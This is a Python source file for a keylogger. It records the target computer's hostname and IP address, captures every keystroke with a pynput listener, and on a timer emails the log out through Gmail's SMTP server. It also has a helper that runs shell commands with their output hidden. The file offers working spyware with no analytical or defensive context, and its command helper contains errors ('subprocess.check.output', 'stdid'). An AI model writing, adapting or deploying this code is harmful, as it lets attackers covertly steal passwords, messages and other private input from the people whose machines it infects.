#!/usr/bin/env python
import smtplib
import subprocess
import pynput.keyboard
import threading
import socket
import sys
import os


class Keylogger:
    def __init__(self, time_interval, email, password):
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        self.log = "Keylogger started " + "\n" + "Target Computer Name is: " + hostname + "\n" + "Target Computer IP Address is: " + IPAddr
        self.interval = time_interval
        self.email = email
        self.password = password

    def execute_system_command(self, commmand):
        DEVNULL = open(os.devnull, 'wb')
        return subprocess.check.output(commmand, shell = True, stderr = DEVNULL, stdid = DEVNULL)

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:  # for special characters
            current_key = str(key.char)
        except AttributeError:  # for special characters
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)  # Timer set on a interval, modify to fit your needs (seconds)
        timer.start()

    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def start(self):
        keystrokes = pynput.keyboard.Listener(on_press=self.process_key_press)  # call back for when a key is pressed
        with keystrokes:
            self.report()
            keystrokes.join()
            sys.exit()
